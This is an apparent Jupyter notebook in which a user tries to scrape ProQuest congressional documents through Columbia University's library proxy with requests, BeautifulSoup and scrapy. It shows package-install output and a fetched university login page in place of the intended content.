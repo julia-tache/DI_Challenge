{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "from bs4 import BeautifulSoup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "URL = 'https://congressional-proquest-com.ezproxy.cul.columbia.edu/congressional/docview/t39.d40.03162403.d56?accountid=10226'\n",
    "page = requests.get(URL)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "soup = BeautifulSoup(page.content, 'html.parser')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting package metadata (current_repodata.json): done\n",
      "Solving environment: done\n",
      "\n",
      "\n",
      "==> WARNING: A newer version of conda exists. <==\n",
      "  current version: 4.8.3\n",
      "  latest version: 4.9.2\n",
      "\n",
      "Please update conda by running\n",
      "\n",
      "    $ conda update -n base -c defaults conda\n",
      "\n",
      "\n",
      "\n",
      "## Package Plan ##\n",
      "\n",
      "  environment location: /Users/JuliaTache/opt/anaconda3\n",
      "\n",
      "  added / updated specs:\n",
      "    - scrapy\n",
      "\n",
      "\n",
      "The following packages will be downloaded:\n",
      "\n",
      "    package                    |            build\n",
      "    ---------------------------|-----------------\n",
      "    automat-20.2.0             |             py_0          30 KB  conda-forge\n",
      "    bcrypt-3.2.0               |   py38h5406a74_1          44 KB  conda-forge\n",
      "    conda-4.9.2                |   py38h50d1736_0         3.1 MB  conda-forge\n",
      "    constantly-15.1.0          |             py_0           9 KB  conda-forge\n",
      "    cssselect-1.1.0            |             py_0          18 KB  conda-forge\n",
      "    hyperlink-21.0.0           |     pyhd3deb0d_0          71 KB  conda-forge\n",
      "    incremental-17.5.0         |             py_0          14 KB  conda-forge\n",
      "    itemadapter-0.2.0          |     pyhd8ed1ab_0          12 KB  conda-forge\n",
      "    itemloaders-1.0.4          |     pyhd8ed1ab_0          14 KB  conda-forge\n",
      "    jmespath-0.10.0            |     pyh9f0ad1d_0          21 KB  conda-forge\n",
      "    parsel-1.6.0               |             py_0          15 KB  conda-forge\n",
      "    protego-0.1.16             |             py_0         2.6 MB  conda-forge\n",
      "    pyasn1-0.4.8               |             py_0          53 KB  conda-forge\n",
      "    pyasn1-modules-0.2.7       |             py_0          60 KB  conda-forge\n",
      "    pydispatcher-2.0.5         |             py_1          12 KB  conda-forge\n",
      "    pyhamcrest-2.0.2           |             py_0          29 KB  conda-forge\n",
      "    python_abi-3.8             |           1_cp38           4 KB  conda-forge\n",
      "    queuelib-1.5.0             |     pyh9f0ad1d_0          13 KB  conda-forge\n",
      "    scrapy-2.4.1               |   py38h50d1736_2         648 KB  conda-forge\n",
      "    service_identity-18.1.0    |             py_0          12 KB  conda-forge\n",
      "    twisted-20.3.0             |   py38h5406a74_2         5.0 MB  conda-forge\n",
      "    w3lib-1.22.0               |     pyh9f0ad1d_0          21 KB  conda-forge\n",
      "    ------------------------------------------------------------\n",
      "                                           Total:        11.7 MB\n",
      "\n",
      "The following NEW packages will be INSTALLED:\n",
      "\n",
      "  automat            conda-forge/noarch::automat-20.2.0-py_0\n",
      "  bcrypt             conda-forge/osx-64::bcrypt-3.2.0-py38h5406a74_1\n",
      "  constantly         conda-forge/noarch::constantly-15.1.0-py_0\n",
      "  cssselect          conda-forge/noarch::cssselect-1.1.0-py_0\n",
      "  hyperlink          conda-forge/noarch::hyperlink-21.0.0-pyhd3deb0d_0\n",
      "  incremental        conda-forge/noarch::incremental-17.5.0-py_0\n",
      "  itemadapter        conda-forge/noarch::itemadapter-0.2.0-pyhd8ed1ab_0\n",
      "  itemloaders        conda-forge/noarch::itemloaders-1.0.4-pyhd8ed1ab_0\n",
      "  jmespath           conda-forge/noarch::jmespath-0.10.0-pyh9f0ad1d_0\n",
      "  parsel             conda-forge/noarch::parsel-1.6.0-py_0\n",
      "  protego            conda-forge/noarch::protego-0.1.16-py_0\n",
      "  pyasn1             conda-forge/noarch::pyasn1-0.4.8-py_0\n",
      "  pyasn1-modules     conda-forge/noarch::pyasn1-modules-0.2.7-py_0\n",
      "  pydispatcher       conda-forge/noarch::pydispatcher-2.0.5-py_1\n",
      "  pyhamcrest         conda-forge/noarch::pyhamcrest-2.0.2-py_0\n",
      "  python_abi         conda-forge/osx-64::python_abi-3.8-1_cp38\n",
      "  queuelib           conda-forge/noarch::queuelib-1.5.0-pyh9f0ad1d_0\n",
      "  scrapy             conda-forge/osx-64::scrapy-2.4.1-py38h50d1736_2\n",
      "  service_identity   conda-forge/noarch::service_identity-18.1.0-py_0\n",
      "  twisted            conda-forge/osx-64::twisted-20.3.0-py38h5406a74_2\n",
      "  w3lib              conda-forge/noarch::w3lib-1.22.0-pyh9f0ad1d_0\n",
      "\n",
      "The following packages will be UPDATED:\n",
      "\n",
      "  conda                       pkgs/main::conda-4.8.3-py38_0 --> conda-forge::conda-4.9.2-py38h50d1736_0\n",
      "\n",
      "\n",
      "\n",
      "Downloading and Extracting Packages\n",
      "parsel-1.6.0         | 15 KB     | ##################################### | 100% \n",
      "twisted-20.3.0       | 5.0 MB    | ##################################### | 100% \n",
      "constantly-15.1.0    | 9 KB      | ##################################### | 100% \n",
      "automat-20.2.0       | 30 KB     | ##################################### | 100% \n",
      "itemloaders-1.0.4    | 14 KB     | ##################################### | 100% \n",
      "queuelib-1.5.0       | 13 KB     | ##################################### | 100% \n",
      "conda-4.9.2          | 3.1 MB    | ##################################### | 100% \n",
      "service_identity-18. | 12 KB     | ##################################### | 100% \n",
      "jmespath-0.10.0      | 21 KB     | ##################################### | 100% \n",
      "python_abi-3.8       | 4 KB      | ##################################### | 100% \n",
      "bcrypt-3.2.0         | 44 KB     | ##################################### | 100% \n",
      "incremental-17.5.0   | 14 KB     | ##################################### | 100% \n",
      "pydispatcher-2.0.5   | 12 KB     | ##################################### | 100% \n",
      "pyhamcrest-2.0.2     | 29 KB     | ##################################### | 100% \n",
      "pyasn1-0.4.8         | 53 KB     | ##################################### | 100% \n",
      "pyasn1-modules-0.2.7 | 60 KB     | ##################################### | 100% \n",
      "w3lib-1.22.0         | 21 KB     | ##################################### | 100% \n",
      "cssselect-1.1.0      | 18 KB     | ##################################### | 100% \n",
      "scrapy-2.4.1         | 648 KB    | ##################################### | 100% \n",
      "protego-0.1.16       | 2.6 MB    | ##################################### | 100% \n",
      "hyperlink-21.0.0     | 71 KB     | ##################################### | 100% \n",
      "itemadapter-0.2.0    | 12 KB     | ##################################### | 100% \n",
      "Preparing transaction: done\n",
      "Verifying transaction: \\ WARNING conda.core.path_actions:verify(962): Unable to create environments file. Path not writable.\n",
      "  environment location: /Users/JuliaTache/.conda/environments.txt\n",
      "\n",
      "done\n",
      "Executing transaction: - WARNING conda.core.envs_manager:register_env(50): Unable to register environment. Path not writable or missing.\n",
      "  environment location: /Users/JuliaTache/opt/anaconda3\n",
      "  registry file: /Users/JuliaTache/.conda/environments.txt\n",
      "done\n",
      "\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "conda install -c conda-forge scrapy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: scrapy in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (2.4.1)\n",
      "Requirement already satisfied: Twisted>=17.9.0 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (20.3.0)\n",
      "Requirement already satisfied: zope.interface>=4.1.3 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (4.7.1)\n",
      "Requirement already satisfied: itemadapter>=0.1.0 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (0.2.0)\n",
      "Requirement already satisfied: protego>=0.1.15 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (0.1.16)\n",
      "Requirement already satisfied: itemloaders>=1.0.1 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (1.0.4)\n",
      "Requirement already satisfied: parsel>=1.5.0 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (1.6.0)\n",
      "Requirement already satisfied: PyDispatcher>=2.0.5 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (2.0.5)\n",
      "Requirement already satisfied: cryptography>=2.0 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (2.9.2)\n",
      "Requirement already satisfied: service-identity>=16.0.0 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (18.1.0)\n",
      "Requirement already satisfied: w3lib>=1.17.0 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (1.22.0)\n",
      "Requirement already satisfied: lxml>=3.5.0; platform_python_implementation == \"CPython\" in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (4.5.2)\n",
      "Requirement already satisfied: pyOpenSSL>=16.2.0 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (19.1.0)\n",
      "Requirement already satisfied: queuelib>=1.4.2 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (1.5.0)\n",
      "Requirement already satisfied: cssselect>=0.9.1 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from scrapy) (1.1.0)\n",
      "Requirement already satisfied: constantly>=15.1 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from Twisted>=17.9.0->scrapy) (15.1.0)\n",
      "Requirement already satisfied: hyperlink>=17.1.1 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from Twisted>=17.9.0->scrapy) (21.0.0)\n",
      "Requirement already satisfied: attrs>=19.2.0 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from Twisted>=17.9.0->scrapy) (20.3.0)\n",
      "Requirement already satisfied: incremental>=16.10.1 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from Twisted>=17.9.0->scrapy) (17.5.0)\n",
      "Requirement already satisfied: Automat>=0.3.0 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from Twisted>=17.9.0->scrapy) (20.2.0)\n",
      "Requirement already satisfied: PyHamcrest!=1.10.0,>=1.9.0 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from Twisted>=17.9.0->scrapy) (2.0.2)\n",
      "Requirement already satisfied: setuptools in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from zope.interface>=4.1.3->scrapy) (49.2.0.post20200714)\n",
      "Requirement already satisfied: six in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from protego>=0.1.15->scrapy) (1.15.0)\n",
      "Requirement already satisfied: jmespath>=0.9.5 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from itemloaders>=1.0.1->scrapy) (0.10.0)\n",
      "Requirement already satisfied: cffi!=1.11.3,>=1.8 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from cryptography>=2.0->scrapy) (1.14.0)\n",
      "Requirement already satisfied: pyasn1 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from service-identity>=16.0.0->scrapy) (0.4.8)\n",
      "Requirement already satisfied: pyasn1-modules in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from service-identity>=16.0.0->scrapy) (0.2.8)\n",
      "Requirement already satisfied: idna>=2.5 in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from hyperlink>=17.1.1->Twisted>=17.9.0->scrapy) (2.10)\n",
      "Requirement already satisfied: pycparser in /Users/JuliaTache/opt/anaconda3/lib/python3.8/site-packages (from cffi!=1.11.3,>=1.8->cryptography>=2.0->scrapy) (2.20)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install scrapy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from scrapy.http import TextResponse\n",
    "\n",
    "res = requests.get('https://congressional-proquest-com.ezproxy.cul.columbia.edu/congressional/result/congressional/congdocumentview?accountid=10226&groupid=106481&parmId=17740E837ED&rsId=17740E828AB#0')\n",
    "response = TextResponse(res.url, body=res.text, encoding='utf-8')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<!DOCTYPE html><html>\\r\\n<head>\\r\\n    <title>Columbia University Authentication</title>\\r\\n    <meta charset=\"UTF-8\"/><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\"/><link rel=\"stylesheet\" href=\"/cas/webjars/font-awesome/5.0.13/web-fonts-with-css/css/fontawesome-all.min.css\"/><link type=\"text/css\" rel=\"stylesheet\" href=\"/cas/webjars/lato/0.3.0/css/lato.min.css\"/><link type=\"text/css\" rel=\"stylesheet\" href=\"/cas/css/columbia.css\"/><link type=\"text/css\" rel=\"stylesheet\" href=\"/cas/css/cas.css\"/><link type=\"text/css\" href=\"/cas/css/cu-privacy-notice.css\" rel=\"stylesheet\"/><link rel=\"icon\" href=\"/cas/favicon.ico\" type=\"image/x-icon\"/><script type=\"text/javascript\" src=\"/cas/webjars/jquery/3.3.1/jquery.min.js\"></script>\\r\\n\\r\\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" /><link type=\"text/css\" href=\"/cas/css/cas.css\" rel=\"stylesheet\" /><link type=\"text/css\" href=\"/cas/css/columbia.css\" rel=\"stylesheet\" /></head>\\r\\n\\r\\n<body id=\"cas\" class=\"fl-theme-iphone\">\\r\\n<div class=\"fl-screenNavigator-view-container\">\\r\\n<div class=\"fl-screenNavigator-view\">\\r\\n\\r\\n<header>\\n\\n        <div> \\n            <div id=\"navigation\">\\n                <ul>\\n                    <li><a tabindex=\"1\" href=\"http://www.columbia.edu/prospective_students/index.html\">Admissions</a></li>\\n                    <li><a tabindex=\"2\" href=\"http://www.columbia.edu/academic_programs/index.html\">Academics</a></li>\\n                    <li><a tabindex=\"3\" href=\"http://www.columbia.edu/cu/lweb/\">Libraries</a></li>\\n                    <li><a tabindex=\"4\" href=\"http://www.columbia.edu/email_computing/index.html\">Email &amp; Computing</a></li>\\n                    <li><a tabindex=\"5\" href=\"http://www.columbia.edu/students/\">Students</a></li>\\n                    <li><a tabindex=\"6\" href=\"http://alumni.columbia.edu/\">Alumni</a></li>\\n                    <li><a tabindex=\"7\" href=\"http://www.columbia.edu/faculty_staff/index.html\">Faculty &amp; Staff</a></li>\\n                </ul>\\n            </div>\\n\\t\\t\\t<br/><br/><br/><div id=\"header\" class=\"flc-screenNavigator-navbar fl-navbar fl-table clear\">\\n            <!--<h1 id=\"app-name\" class=\"fl-table-cell\">Central Authentication Service (CAS)</h1>--></div>\\n\\n        </div>\\n \\n    </header>\\r\\n\\r\\n<main role=\"main\" class=\"container mt-3 mb-3\">\\r\\n    <div id=\"main-content\" class=\"row\">\\r\\n\\r\\n<div id=\"content\" class=\"fl-screenNavigator-scroll-container\">\\r\\n\\r\\n\\r\\n<div align=\"center\" style=\"clear: both; background-color: #FFFFFF;\">\\r\\n <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\" >\\r\\n<tr>\\r\\n\\r\\n<td align=\"left\" style=\"font-size:13px; color: #104E8B;\" >\\r\\n\\r\\n<hr style=\"border: double; border-color: white;\"><em>\\r\\n\\r\\n\\tBe alert to <a target=\"_blank\" href=\"https://cuit.columbia.edu/phishing\">phishing emails</a> and think before you click<br/>\\r\\n    on any link in an email message. CUIT will never ask for your password<br/>\\r\\n    or private personal information via email. Visit <a target=\"_blank\" href=\"https://cuit.columbia.edu/phishing\">Manage My Uni</a> \\r\\n\\tfor password services.\\r\\n\\r\\n</em>\\r\\n<hr style=\"border: double; border-color: white;\"></td>\\r\\n\\r\\n</tr>\\r\\n</table>\\r\\n</div>\\r\\n<br/><br/><br/><div class=\"box fl-panel\" id=\"login\">\\r\\n\\r\\n  \\t<img src=\"login_files/logo-cu-shib-origin.gif\" alt=\"web-infra-wwwlinux\" /><form method=\"post\" id=\"fm1\" class=\"fm-v clearfix\" action=\"login\">\\r\\n\\t\\t\\r\\n        <div class=\"row fl-controls-left text-field\">\\r\\n            <label for=\"username\" class=\"fl-label username-label\"><span class=\"accesskey\">U</span>sername:</label>\\r\\n\\t\\t\\t\\r\\n            <input id=\"username\" name=\"username\" class=\"required\" size=\"25\" tabindex=\"8\" path=\"username\" type=\"text\"\\r\\n                   accesskey=\"u\"\\r\\n                   autocomplete=\"off\"/></div>\\r\\n\\r\\n\\r\\n        <section class=\"form-group\">\\n            <div class=\"row fl-controls-left text-field\">\\r\\n            <label for=\"password\" class=\"fl-label password-field\"><span class=\"accesskey\">P</span>assword:</label>\\r\\n            <input class=\"form-control required\" type=\"password\" id=\"password\" size=\"25\" tabindex=\"9\" \\r\\n                   accesskey=\"p\"\\n                   autocomplete=\"off\" name=\"password\" value=\"\"/><p><span id=\"capslock-on\" style=\"display:none;\">\\r\\n                <i class=\"fa fa-exclamation-circle\"></i><span>CAPSLOCK key is turned on!</span>\\r\\n            </span></p>\\r\\n\\n            </div>\\r\\n          </section>\\r\\n\\r\\r\\n          <div class=\"row btn-row\"> \\r\\n\\t\\t  \\r\\n            <span style=\"padding-right:20px\"> <a href=\"https://cuit.columbia.edu/cuit/manage-my-uni\" target=\"_blank\">UNI Help</a> </span>\\r\\n\\r\\n           \\r\\n            <input type=\"hidden\" name=\"execution\" value=\"db2ced38-0910-4a03-a324-ea6eec9f6e1c_ZXlKaGJHY2lPaUpJVXpVeE1pSjkuZ1BEVXVzemJHclRSR0FZb3M2ZlhpMVZhcXZKLy9wbHRNSG4wTEYwa21tSDY1QVh3QVpaTDlFWGtReGZaUXVvSUNWUXlMWkxXTlFSQTJyV1R0OFRXckdZLzFpVnlMOGkwV0NLMFRzZkJrSE1PU2w5YlpLK1F3ZHFta0N3aHZiaHN1WDVUeCt6cTBnWmhyazBXclpRSGk4b1RadHVRcmVDd0ZpNHcraXcza3pRZ3hZTms1VVlMeGZyKzd0QzlYZ0IzbHF6bjJuc243bW5DS29KYkhWZzBOaDhwVE9VOURMRnlxeHNmRk1jN3RaTCtGK0xEdk4wa0luS1ZWdjk0K1kxVE1rQXVDYnAyeVdRWEVHaHRjTHBrLzZ5dm83Um9qTmNMZUxlK3pnR2dxRXRMdVFFQmh2NmNBem5UY011OW9TVlJrdDRJN0lkUzBoL3ROUjd3WThHR1p1YzRISFJTNC9xL1FBVHV2aUJTdkdBMHpMRHo3T0tnNmNvZmNEWXZCbjNMZVROUFhXRFU1dVpZL1ZxTVlWWW5Uczd3S1BSMFB3MmNUdi9qZ29SNEk2ZWxrbmlMbTZyRVY3aVNSUjNUaVBpckIzSE5nWVJ2UmZobWM0bXFTWVFhcXppdW1NSnJ5OEgzTmlidisvTDIrUldTQUhVQmU3V1hlUGJ1VEVKZEkxVi9OU1lBN0NhV3BROUhKZ1NQbXFDTXpxeTFGUFVxamNYMHdaOXliR3EzNGdMckNNdG8rY2FqbjNHQ3J1Q3dYWUgvUWlYQ2w1MWt0VVZyZUJRejRkaE9qRFdzVHlIck1SY2Z1bDZTeE1waUc1cVQ0UVMzNDNXQzFTbXdqQzkyd2xnUDV0TTZtY2tsYlFKZm04QUJVVlBjalJuUTM2VnJuRXpwaWovWkVucjV6dnJhMnFlTmppRGs3b0h6RzBlNVhoQzR2bXA0SWIzMTZMZGpVRExWem1IZHBNRDZHOHVjaitrZzZXdVMwOVVSZzN2aXl1VUhkdWhNT0c4VmM2SlVDQWNIRlVuK0NaYmFVS1N6SU1ndFB4TVZpR1A1V1pTdXA5TWF5VVN3T1d5Zmp3UGZsbitZbnBVK1lzZ293WkUybmtpaVdTR1BTZmI0bE90ZXE5VVQ1bGQrMUlPV0graHRGckp1R1RWYVg2VGl5OGtiK1UyMXM2Qm4vYzlNeGRBMGVkRjJHYzIzMUh5S0E4cUhqeEI5RjA2eGg3bzMyMTR1MEVZSU9FVXovS0tWMDc3b0RsTkNITmtaZ2JvMFAwQWVFN1pxZTNjVHhNWVlGelBnS0pnZ1NIZHo2R1RpYUg2U0hOeERES0lRRm5lamQrVEw0M28xL3NhaVRlTHN6N3Z0K1oxZkhrWDlaVFNLZ05GYWo5amdzTDl5S3A0WFg4L0lOZSt4UDBnalhra2JZYStNRzROMk96OVA1VGY2R3AxS0pTNWxmZ1lNQ0pxVGh3dlI1em9PUEVjUTRON0JKL2hPanBvOXRUQmhlYW95NGZxd2YzNUJvMVB4cVN0TWNZKzlQVC8wRHRpOEVuVmk1Wkpkc2pqRlVZcFBteklTcGczazBUZTJpcmRIQmpSTEIvNGVBTlp1Sk52cU9RNklkY0pJNzJITDRTNnRRVUo2Rk1NK0hJcVVXUm1ZRjcxVG52NktQeUtRMU5qZFJzRmxIZVo3VDBkV0E2dzlmZElIVkJrOUVOSUZvOWdPaExCWUZOVG1lSVFJOUVzSitQa3NGazhBMnFwNmhXaklBU1l1U1VlNVZhL3l4ZUtQNWoxNlNnbFZSVGg1a3pQWTZvWXpkZHZHdXFCUmE0b3Y4cC9BOHFzR0tEY3Vldi93OXpQZFhWRHdROVRZNnBzQlE2dzBQai9NZjcwUzJTejhDZVlTaG45T3dia21CTVlKV1dvMFlTZkEzRzNHZGZJNWZUY3IyQjVZMkttYWRYTFdzOFNZNnhMeXhHWjZ5Z2grYWZBY1F2MWR6cWllUm9aMzRXcUhTNUliR3ZLM3k2VTZHT0VKd1BSVDhsU2RnVldXVW1iczVYSTJvcnh3M0hXY0hwTXdjZUJUdnZkclNEK3c0TkxaZE9BTHNJaUEvdXk5SEdOdG9NbEJvWmlQeG5Wb3R3eGJ4QXBMZm0xTCtqT1FVYXBhQnE5VTVFSU5uOUd3aXlodlhaNDhCRklkSHJ1bkd4OXRJMXlERzRjTW1ZTzFTalc1Z1lmb0lHZzUzbjJwRWxOZWo4RWw2dHlqS3BhM3lJOFg4Q05SNkdvNnBBM1MxZEJJL0l3N3BFbnlvd2xUK1BPaVBTdFZSczZYMUJ6aHFLK3kzZ01JZk83S1lKQjlaT2k1eGtmM3hRZGlKSzNaWElTOVFzb3J5U3JmUEdMTHpudDk4STFaS3hDejNrdDdHdm1LRTF3c2xvaGtpVzgwNmE4OVV6TUFuMnN5ZXl3TVZ4Ny80V2NXWUpTSVM5VGNUU3BuclVHanhBYW9ZbTlFR05ZVXJvOXhjVmpjZmcwVE8ybWpuZDFHTnhNenVrMldBeTRaQjlBbStaWDl0dFVRZHhTajdmKzRNNDRLY1JCNmZVQlkwWjRIWnA4K04wZWh3ZTJ0QkgvWVdBclE1VDZ6enBjc0loakx6K0IrTFNzOWJ6Rkd2WDloSWRnV3Z1N1RhaGxRc3BFVVFIdEtWQmh3amZiZ3hBSGlBZ0FNMjNhbThaTzRWRlBCVlljR3MwOThobVVDUGNVOTZJdHVMZjVpcHM4YVhQK2JyZVZVZ3lKLy9nTFJWWDdTeHovL0NvZnRGQ0dnQi9oRVBMWHJNaE1MOEpOcERzS3k2VUVndWk4T3FoWVRZYUYyTFY1TUwyQXlCT1JoUVJKTk9HK0RRbllzeHV2bG03YWRCUG1oRXVWZXpudWpzNGhjeWRtWGJDNVVYSXgvL2tzbVdtMnd0R0pUcDNNWHJuKzlBWTQvV1EyZ0k2OE5rT042YThFcng2SDlmQlNnYUVSVzR2Wlg1aWh1NlRaMWNjNlBGNkxHUWxYK1R2TXBSdzRWdGsxTzlWWXFnRGsvVTdUSWJuM0cvWUx5Z0NtSFoydFpnRHpuS3lGK2RFVWNDNlY5WmQ1bXdrSEQ3MkxCN1ZrOCtDR3NZclRoUlM4OS9vajU5QjhicTU2NlNpZXFBTTNzZFZPVkVxd3VlQ2pucFMzSkhhdWk0dGxDQUwvYUdOVjNyY0VqakRBZmJEQVUxODFXWDIrR3ZVV1c1Vks2VzVJdW1wemR2bitXRjZITXJDcitNKzZkbjNYUkRWc0hqU1lWK29EcUp2eCtPeFlna0tHQUltMmNhRzRFdnhlYUZaTnZHM0dBV09lZDQyNUxmZ29HVTZiNFp6ZTR4ZDFGdG5ac09iSFU2azRjVmFnTlAvMmx2RzFqSFhNbjhuOFpMeXl0Ky9NU2JacUNNbnJuQ2ZBRC9hdUg0SjdyMEVoQ3BJSDZ5UGdXUmJrU1hnbFNsQlFrdnUremJpcGc0ZUduVEx5WnR0NzRITkdwTDd5VWJlMFBSTG9XRW8zOUs1aUY4VUdZajUveTYxcXcwMWxZbzFSRlNvZVJVdTBPOWlUZ0Y2ZFpzZkdYVWJjUnlaaXpJZkNMcDQrdXNndHdnMkRGRWpYNG13UzJrcUJOcnVXMThEejV3WFVucENEN2NBaG41a3F6TE93c0JoSzRONVdzSW1uTitXZDdTdmdIalR2aWN6SGZiQURCWGhzT2pUZ0dRZnM2MG4zaUFQdUhXT3d0Sy9xZUlPYUwvcFc4aFRvcC9ZWU5nUHhhZ2J3K0FVNFZlaTFYZmZkKzNLNGlNWm53VHNadkxPN3RsZjhLZHp3eksvaGFhc1NOVEFUM2VDbldINWgySWxkeTJKRHNPR05WNnB5Z3VMdE1jbDlibmdPdUJreXlmdFVHaGVTWThEWm9RY25DMjVoVm1UYnJ3YXRjVnB0Y1pTcHgxL1UwZ21RQjBtcmtnRk5MMHJwVEpkRWMzT3BscnZNVWtsU3pHRzlINWhsdnR6eHNxTWdyMkViNHZCdkJocXNSMGJ1ZEpxL0NhbmFXQzBlbHFVM2NoeXN2UXRnMU5YZnpXbmJPUDlEVnV0enQ3cUM4YjVBMGJUZzBFWnc5algyejYrQzViOTFGOHhQd3NKeDloSTA2Q3NxU0l0Z2oxV0FUTGVxSE5XSEpNaE0wRThjTGgxcWx6NmlsNlkyVDF2UTc1WnlMOWMrelN4MGQwVWlpLzRrTVBqblF0VUtKOFY0T1dKVU9IalZDNXMyZE50bXAyUnRBblI0S0pGdGJSKzdFNG96bm42MFRhTGVYVHg3NXNpWjkzU3A4WGpCUW9lMHVxTXhGSEVpK3E0Um5LZUk3R3V5Z0hVRnhBaHVhbnlIYk80dWlrdTgzdERkMEZqaXpDUGdIQWpBVVRpTUgxMWVaQ2JrYjE3RnNWc3o4L3A2cy95WjdDd1gxdFc5a2NnUW8xTGlVRUlrQ05xV0dlYkJYVnRWc2VIdUYwcjRjenFxK0FKRTIxQnJCbmRreVc0akN3SzZGNkpTN2Y0TnM5M0g0VUJUSDRoaWNRMUNWSDNRVGtjWDdiTEYzc0ZGWWFvVWRlc1RkRzVERzJNdm5mMGZNdjRoakljcFBMdnpkUGNuampVYU1hNGoxaGRFM3ZLeDVCMzVyNEh6bHZpc0FuU0hJNEZDZXBqMWZndVRQekJ4REJabVJYUjlvVUZ6NlZST1FWNzJyVjFhWG1uemJFNDZKSWk3WGErNWU2V2J6OCtPdVE4UFE4NHdLY2ZkRzZ3NGVRYUVnUGxtbitzTi9nYlJQNDdKTGlYeVdmSVd3QU03TC9YNGRDZVYvYTlLRWo5TkRVM3dzYnhsdDVQRll6T0hEdFJ3N2VwR2tSQmJMVFZPQldJSG1NeEhibjgrcXVFYnRjQkducjFvV1djRHlvbGdNb0IzY21IVEdxVFZCdFM1Tm5NNWpMQm16MUR6Z0F3Y2dzSW4rRWJlR3h5S2NrZXErelE2RFBsWDlZVEZCOFY3aG9BWHlJdDhFTlFFMFdFclZpK0tXbTZvZFpxd0ttVi9GNVFGWTh6aVhBTGFxeG05a3E2dmNQYkFpc2xWb0NsU1pBRGtXZVdLNzVyUUpGNHZKNlI0a1pBRGJaZnlSYVIwRFNFVEt4YStnNkFncTd2UlU2bUVCWkplZWRQUkZZNGdGTGVRc0dHL2h2YTFxVXNmTEo0SFlTd1FObTh2ZVVCRXRnZjBVVUFlbEFyZjJmak9HdTMxYXNPYWFRTjBZa3gxSGF4RnNJQUI1dTFZTHlOVVc2S2FBcElPWkhyelo0ck9kZmlKMU5Qc1JLSUMvREVidUdzS2ZUL2dVSFlsMFErdmEwSERNSGFUYlVpQzVsakd5cHJJeUx1eTRDck93ZjV3RkxWVS9JVzlTYXVIbUxGeFJVemRBWnFYSXdsL3ZTL2FkQTM1NlJqVlpWcWR2SE9CaGtZN3RnOEdkb015VHQxTFcrSFJiMGttUTdYTDZlSWJCbFlTdEwzR2dHZEEyb3F2N0I0SE9NNzZNaDgzSkFOZlh1bUVvaVd5bWphMGFQVWlqbnJzRkozL0RmeE5aNHVSZGZiNjNkNFpSSHpmM1hTbEh0Y1VzR2x3amtacVI0U3ZXSWRyTDNvdlRZRzIxY0N4dER2RWtNc2ZWUHl4dGdjQzFVYkZJTkRMN096TVQ0SFRkRFdSQWZRVkVBUStjZUZGei85M0lHcG1NTURDSEk3Y2ljc3J6UlFRNnRNa2ZVemt1b0JKcHNKV0pMdTIrOGF6NFN0SGN0Z1Nka2JZQytGYUkrVkZraWFtWTZuNWd2OGVMaU1HZlJXWlRyR2JZMDZBRFA0YVJHTE1qYTlrPS5RZWFPLTZxQ0djYVVocXBLSDA5eE5WVzVlbmdMbURlVnQ4OFFWY2hsTWkxTU43REhSdE1TanAtNGZMQ2FGRkY5ME40SjhpSHVHaW02OEt3SWRlZnNBdw==\" /><input type=\"hidden\" name=\"_eventId\" value=\"submit\" /><input 